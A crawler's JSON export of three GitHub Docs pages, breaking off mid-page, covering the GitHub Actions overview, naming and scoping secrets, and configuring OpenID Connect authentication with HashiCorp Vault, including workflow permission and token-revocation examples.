[{
  "url": "https://docs.github.com/en/actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions",
    "loadedTime": "2025-05-08T06:36:45.399Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 0,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions",
    "title": "GitHub Actions documentation - GitHub Docs",
    "description": "Automate, customize, and execute your software development workflows right in your repository with GitHub Actions. You can discover, create, and share actions to perform any job you'd like, including CI/CD, and combine actions in a completely customized workflow.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "GitHub Actions documentation - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "F212:1FF628:71C39:9413F:681BE32D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "28111",
      "date": "Thu, 08 May 2025 06:36:44 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686204.400467, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29144",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "GitHub Actions documentation - GitHub Docs\nAutomate, customize, and execute your software development workflows right in your repository with GitHub Actions. You can discover, create, and share actions to perform any job you'd like, including CI/CD, and combine actions in a completely customized workflow.\nOverview Quickstart",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-4y0sah.html",
  "markdown": "# GitHub Actions documentation - GitHub Docs\n\nAutomate, customize, and execute your software development workflows right in your repository with GitHub Actions. You can discover, create, and share actions to perform any job you'd like, including CI/CD, and combine actions in a completely customized workflow.\n\n[Overview](https://docs.github.com/en/actions/about-github-actions/understanding-github-actions) [Quickstart](https://docs.github.com/en/actions/writing-workflows/quickstart)",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 290,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 528,
      "readableText": 804,
      "none": 48868,
      "readableTextIfPossible": 48868,
      "result": 804,
      "markdown": 485
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-secrets",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-secrets",
    "loadedTime": "2025-05-08T06:36:55.131Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-secrets",
    "title": "About secrets - GitHub Docs",
    "description": "Learn about secrets as they're used in GitHub Actions.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About secrets - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/about-secrets"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/about-secrets"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "E885:56D02:2F2689:3CD05A:681BE606",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "27389",
      "date": "Thu, 08 May 2025 06:36:52 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686213.526317, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26308",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About secrets - GitHub Docs\nLearn about secrets as they're used in GitHub Actions.\nAbout secrets\nSecrets allow you to store sensitive information in your organization, repository, or repository environments. Secrets are variables that you create to use in GitHub Actions workflows in an organization, repository, or repository environment.\nGitHub Actions can only read a secret if you explicitly include the secret in a workflow.\nNaming your secrets\nTip\nTo help ensure that GitHub redacts your secrets in logs correctly, avoid using structured data as the values of secrets.\nThe following rules apply to secret names:\nCan only contain alphanumeric characters ([a-z], [A-Z], [0-9]) or underscores (_). Spaces are not allowed.\nMust not start with the GITHUB_ prefix.\nMust not start with a number.\nAre case insensitive.\nMust be unique to the repository, organization, or enterprise where they are created.\nIf a secret with the same name exists at multiple levels, the secret at the lowest level takes precedence. For example, if an organization-level secret has the same name as a repository-level secret, then the repository-level secret takes precedence. Similarly, if an organization, repository, and environment all have a secret with the same name, the environment-level secret takes precedence.\nUsing your secrets in workflows\nWarning\nIf a secret is used in a workflow job, GitHub automatically redacts secrets printed to the log. You should avoid printing secrets to the log intentionally.\nOrganization-level secrets let you share secrets between multiple repositories, which reduces the need for creating duplicate secrets. Updating an organization secret in one location also ensures that the change takes effect in all repository workflows that use that secret.\nFor environment secrets, you can enable required reviewers to control access to the secrets. A workflow job cannot access environment secrets until approval is granted by required approvers.\nTo make a secret available to an action, you must set the secret as an input or environment variable in your workflow file. Review the action's README file to learn about which inputs and environment variables the action expects. See Workflow syntax for GitHub Actions.\nOrganization and repository secrets are read when a workflow run is queued, and environment secrets are read when a job referencing the environment starts.\nLimiting credential permissions\nWhen generating credentials, we recommend that you grant the minimum permissions possible. For example, instead of using personal credentials, use deploy keys or a service account. Consider granting read-only permissions if that's all that is needed, and limit access as much as possible.\nWhen generating a personal access token (classic), select the fewest scopes necessary. When generating a fine-grained personal access token, select the minimum permissions and repository access required.\nInstead of using a personal access token, consider using a GitHub App, which uses fine-grained permissions and short lived tokens, similar to a fine-grained personal access token. Unlike a personal access token, a GitHub App is not tied to a user, so the workflow will continue to work even if the user who installed the app leaves your organization. For more information, see Making authenticated API requests with a GitHub App in a GitHub Actions workflow.\nFurther reading\nUsing secrets in GitHub Actions\nREST API endpoints for GitHub Actions Secrets",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-about-secrets-fal5x.html",
  "markdown": "# About secrets - GitHub Docs\n\nLearn about secrets as they're used in GitHub Actions.\n\n## [About secrets](#about-secrets)\n\nSecrets allow you to store sensitive information in your organization, repository, or repository environments. Secrets are variables that you create to use in GitHub Actions workflows in an organization, repository, or repository environment.\n\nGitHub Actions can only read a secret if you explicitly include the secret in a workflow.\n\n## [Naming your secrets](#naming-your-secrets)\n\nTip\n\nTo help ensure that GitHub redacts your secrets in logs correctly, avoid using structured data as the values of secrets.\n\nThe following rules apply to secret names:\n\n*   Can only contain alphanumeric characters (`[a-z]`, `[A-Z]`, `[0-9]`) or underscores (`_`). Spaces are not allowed.\n*   Must not start with the `GITHUB_` prefix.\n*   Must not start with a number.\n*   Are case insensitive.\n*   Must be unique to the repository, organization, or enterprise where they are created.\n\nIf a secret with the same name exists at multiple levels, the secret at the lowest level takes precedence. For example, if an organization-level secret has the same name as a repository-level secret, then the repository-level secret takes precedence. Similarly, if an organization, repository, and environment all have a secret with the same name, the environment-level secret takes precedence.\n\n## [Using your secrets in workflows](#using-your-secrets-in-workflows)\n\nWarning\n\nIf a secret is used in a workflow job, GitHub automatically redacts secrets printed to the log. You should avoid printing secrets to the log intentionally.\n\nOrganization-level secrets let you share secrets between multiple repositories, which reduces the need for creating duplicate secrets. Updating an organization secret in one location also ensures that the change takes effect in all repository workflows that use that secret.\n\nFor environment secrets, you can enable required reviewers to control access to the secrets. A workflow job cannot access environment secrets until approval is granted by required approvers.\n\nTo make a secret available to an action, you must set the secret as an input or environment variable in your workflow file. Review the action's README file to learn about which inputs and environment variables the action expects. See [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsenv).\n\nOrganization and repository secrets are read when a workflow run is queued, and environment secrets are read when a job referencing the environment starts.\n\n## [Limiting credential permissions](#limiting-credential-permissions)\n\nWhen generating credentials, we recommend that you grant the minimum permissions possible. For example, instead of using personal credentials, use [deploy keys](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys) or a service account. Consider granting read-only permissions if that's all that is needed, and limit access as much as possible.\n\nWhen generating a personal access token (classic), select the fewest scopes necessary. When generating a fine-grained personal access token, select the minimum permissions and repository access required.\n\nInstead of using a personal access token, consider using a GitHub App, which uses fine-grained permissions and short lived tokens, similar to a fine-grained personal access token. Unlike a personal access token, a GitHub App is not tied to a user, so the workflow will continue to work even if the user who installed the app leaves your organization. For more information, see [Making authenticated API requests with a GitHub App in a GitHub Actions workflow](https://docs.github.com/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow).\n\n## [Further reading](#further-reading)\n\n*   [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)\n*   [REST API endpoints for GitHub Actions Secrets](https://docs.github.com/en/rest/actions/secrets)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 242,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-about-secrets-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-about-secrets-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-about-secrets-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-about-secrets-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-about-secrets-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 5317,
      "readableText": 4980,
      "none": 24611,
      "readableTextIfPossible": 4980,
      "result": 4980,
      "markdown": 4200
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault",
    "loadedTime": "2025-05-08T06:36:57.931Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault",
    "title": "Configuring OpenID Connect in HashiCorp Vault - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with HashiCorp Vault.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring OpenID Connect in HashiCorp Vault - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "7B57:2C6BB9:0774:0B04:681C5105",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:36:53 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686213.241011, VS0, VE368",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30888",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in HashiCorp Vault\nUse OpenID Connect within your workflows to authenticate with HashiCorp Vault.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with a HashiCorp Vault to retrieve secrets.\nThis guide gives an overview of how to configure HashiCorp Vault to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in the hashicorp/vault-action action to retrieve secrets from HashiCorp Vault.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nAdding the identity provider to HashiCorp Vault\nTo use OIDC with HashiCorp Vault, you will need to add a trust configuration for the GitHub OIDC provider. For more information, see the HashiCorp Vault documentation.\nTo configure your Vault server to accept JSON Web Tokens (JWT) for authentication:\nEnable the JWT auth method, and use write to apply the configuration to your Vault. For oidc_discovery_url and bound_issuer parameters, use https://token.actions.githubusercontent.com. These parameters allow the Vault server to verify the received JSON Web Tokens (JWT) during the authentication process.\nShell\nvault auth enable jwt \nShell\nvault write auth/jwt/config \\ bound_issuer=\"https://token.actions.githubusercontent.com\" \\ oidc_discovery_url=\"https://token.actions.githubusercontent.com\" \nConfigure a policy that only grants access to the specific paths your workflows will use to retrieve secrets. For more advanced policies, see the HashiCorp Vault Policies documentation.\nShell\nvault policy write myproject-production - <<EOF # Read-only permission on 'secret/data/production/*' path path \"secret/data/production/*\" { capabilities = [ \"read\" ] } EOF \nConfigure roles to group different policies together. If the authentication is successful, these policies are attached to the resulting Vault access token.\nShell\nvault write auth/jwt/role/myproject-production -<<EOF { \"role_type\": \"jwt\", \"user_claim\": \"actor\", \"bound_claims\": { \"repository\": \"user-or-org-name/repo-name\" }, \"policies\": [\"myproject-production\"], \"ttl\": \"10m\" } EOF \nttl defines the validity of the resulting access token.\nEnsure that the bound_claims parameter is defined for your security requirements, and has at least one condition. Optionally, you can also set the bound_subject as well as the bound_audiences parameter.\nTo check arbitrary claims in the received JWT payload, the bound_claims parameter contains a set of claims and their required values. In the above example, the role will accept any incoming authentication requests from the repo-name repository owned by the user-or-org-name account.\nTo see all the available claims supported by GitHub's OIDC provider, see About security hardening with OpenID Connect.\nFor more information, see the HashiCorp Vault documentation.\nUpdating your GitHub Actions workflow\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\nAdd permissions settings for the token.\nUse the hashicorp/vault-action action to exchange the OIDC token (JWT) for a cloud access token.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\nTo add OIDC integration to your workflows that allow them to access secrets in Vault, you will need to add the following code changes:\nGrant permission to fetch the token from the GitHub OIDC provider: \nThe workflow needs permissions: settings with the id-token value set to write. This lets you fetch the OIDC token from every job in the workflow.\nRequest the JWT from the GitHub OIDC provider, and present it to HashiCorp Vault to receive an access token: \nYou can use the hashicorp/vault-action action to fetch the JWT and receive the access token from Vault, or you could use the Actions toolkit to fetch the tokens for your job.\nThis example demonstrates how to use OIDC with the official action to request a secret from HashiCorp Vault.\nAdding permissions settings\nThe job or workflow run requires a permissions setting with id-token: write to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the permissions for id-token is not set to write, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see About security hardening with OpenID Connect.\nThe id-token: write setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\nUsing environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN).\nUsing getIDToken() from the Actions toolkit.\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout \nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT \nYou may need to specify additional permissions here, depending on your workflow's requirements.\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the permissions setting for id-token should be explicitly set to write at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\nFor more information, see Reusing workflows.\nNote\nWhen the permissions key is used, all unspecified permissions are set to no access, with the exception of the metadata scope, which always gets read access. As a result, you may need to add other permissions, such as contents: read. See Automatic token authentication for more information.\nRequesting the access token\nThe hashicorp/vault-action action receives a JWT from the GitHub OIDC provider, and then requests an access token from your HashiCorp Vault instance to retrieve secrets. For more information, see the HashiCorp Vault GitHub Action documentation.\nThis example demonstrates how to create a job that requests a secret from HashiCorp Vault.\nVAULT-URL: Replace this with the URL of your HashiCorp Vault.\nVAULT-NAMESPACE: Replace this with the Namespace you've set in HashiCorp Vault. For example: admin.\nROLE-NAME: Replace this with the role you've set in the HashiCorp Vault trust relationship.\nSECRET-PATH: Replace this with the path to the secret you're retrieving from HashiCorp Vault. For example: secret/data/production/ci npmToken.\nYAML\njobs: retrieve-secret: runs-on: ubuntu-latest permissions: id-token: write contents: read steps: - name: Retrieve secret from Vault uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b with: method: jwt url: VAULT-URL namespace: VAULT-NAMESPACE # HCP Vault and Vault Enterprise only role: ROLE-NAME secrets: SECRET-PATH - name: Use secret from Vault run: | # This step has access to the secret retrieved above; see hashicorp/vault-action for more details. \nNote\nIf your Vault server is not accessible from the public network, consider using a self-hosted runner with other available Vault auth methods. For more information, see About self-hosted runners.\nVAULT-NAMESPACE must be set for a Vault Enterprise (including HCP Vault) deployment. For more information, see Vault namespace.\nRevoking the access token\nBy default, the Vault server will automatically revoke access tokens when their TTL is expired, so you don't have to manually revoke the access tokens. However, if you do want to revoke access tokens immediately after your job has completed or failed, you can manually revoke the issued token using the Vault API.\nSet the exportToken option to true (default: false). This exports the issued Vault access token as an environment variable: VAULT_TOKEN.\nAdd a step to call the Revoke a Token (Self) Vault API to revoke the access token.\nYAML\njobs: retrieve-secret: runs-on: ubuntu-latest permissions: id-token: write contents: read steps: - name: Retrieve secret from Vault uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b with: exportToken: true method: jwt url: VAULT-URL role: ROLE-NAME secrets: SECRET-PATH - name: Use secret from Vault run: | # This step has access to the secret retrieved above; see hashicorp/vault-action for more details. - name: Revoke token # This step always runs at the end regardless of the previous steps result if: always() run: | curl -X POST -sv -H \"X-Vault-Token: ${{ env.VAULT_TOKEN }}\" \\ VAULT-URL/v1/auth/token/revoke-self \nFurther reading\nUsing OpenID Connect with reusable workflows\nCommunicating with self-hosted runners",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-hashicorp-vault-gryzwf.html",
  "markdown": "# Configuring OpenID Connect in HashiCorp Vault\n\nUse OpenID Connect within your workflows to authenticate with HashiCorp Vault.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with a HashiCorp Vault to retrieve secrets.\n\nThis guide gives an overview of how to configure HashiCorp Vault to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in the [hashicorp/vault-action](https://github.com/hashicorp/vault-action) action to retrieve secrets from HashiCorp Vault.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n\n## [Adding the identity provider to HashiCorp Vault](#adding-the-identity-provider-to-hashicorp-vault)\n\nTo use OIDC with HashiCorp Vault, you will need to add a trust configuration for the GitHub OIDC provider. For more information, see the HashiCorp Vault [documentation](https://www.vaultproject.io/docs/auth/jwt).\n\nTo configure your Vault server to accept JSON Web Tokens (JWT) for authentication:\n\n1.  Enable the JWT `auth` method, and use `write` to apply the configuration to your Vault. For `oidc_discovery_url` and `bound_issuer` parameters, use `https://token.actions.githubusercontent.com`. These parameters allow the Vault server to verify the received JSON Web Tokens (JWT) during the authentication process.\n    \n    Shell\n    \n    ```\n    vault auth enable jwt\n    ```\n    \n    Shell\n    \n    ```\n    vault write auth/jwt/config \\\n      bound_issuer=\"https://token.actions.githubusercontent.com\" \\\n      oidc_discovery_url=\"https://token.actions.githubusercontent.com\"\n    ```\n    \n2.  Configure a policy that only grants access to the specific paths your workflows will use to retrieve secrets. For more advanced policies, see the HashiCorp Vault [Policies documentation](https://www.vaultproject.io/docs/concepts/policies).\n    \n    Shell\n    \n    ```\n    vault policy write myproject-production - <<EOF\n    # Read-only permission on 'secret/data/production/*' path\n    \n    path \"secret/data/production/*\" {\n      capabilities = [ \"read\" ]\n    }\n    EOF\n    ```\n    \n3.  Configure roles to group different policies together. If the authentication is successful, these policies are attached to the resulting Vault access token.\n    \n    Shell\n    \n    ```\n    vault write auth/jwt/role/myproject-production -<<EOF\n    {\n      \"role_type\": \"jwt\",\n      \"user_claim\": \"actor\",\n      \"bound_claims\": {\n        \"repository\": \"user-or-org-name/repo-name\"\n      },\n      \"policies\": [\"myproject-production\"],\n      \"ttl\": \"10m\"\n    }\n    EOF\n    ```\n    \n\n*   `ttl` defines the validity of the resulting access token.\n*   Ensure that the `bound_claims` parameter is defined for your security requirements, and has at least one condition. Optionally, you can also set the `bound_subject` as well as the `bound_audiences` parameter.\n*   To check arbitrary claims in the received JWT payload, the `bound_claims` parameter contains a set of claims and their required values. In the above example, the role will accept any incoming authentication requests from the `repo-name` repository owned by the `user-or-org-name` account.\n*   To see all the available claims supported by GitHub's OIDC provider, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nFor more information, see the HashiCorp Vault [documentation](https://www.vaultproject.io/docs/auth/jwt).\n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\n\n1.  Add permissions settings for the token.\n2.  Use the [`hashicorp/vault-action`](https://github.com/hashicorp/vault-action) action to exchange the OIDC token (JWT) for a cloud access token.\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\nTo add OIDC integration to your workflows that allow them to access secrets in Vault, you will need to add the following code changes:\n\n*   Grant permission to fetch the token from the GitHub OIDC provider:\n    *   The workflow needs `permissions:` settings with the `id-token` value set to `write`. This lets you fetch the OIDC token from every job in the workflow.\n*   Request the JWT from the GitHub OIDC provider, and present it to HashiCorp Vault to receive an access token:\n    *   You can use the [`hashicorp/vault-action`](https://github.com/hashicorp/vault-action) action to fetch the JWT and receive the access token from Vault, or you could use the [Actions toolkit](https://github.com/actions/toolkit/) to fetch the tokens for your job.\n\nThis example demonstrates how to use OIDC with the official action to request a secret from HashiCorp Vault.\n\n### [Adding permissions 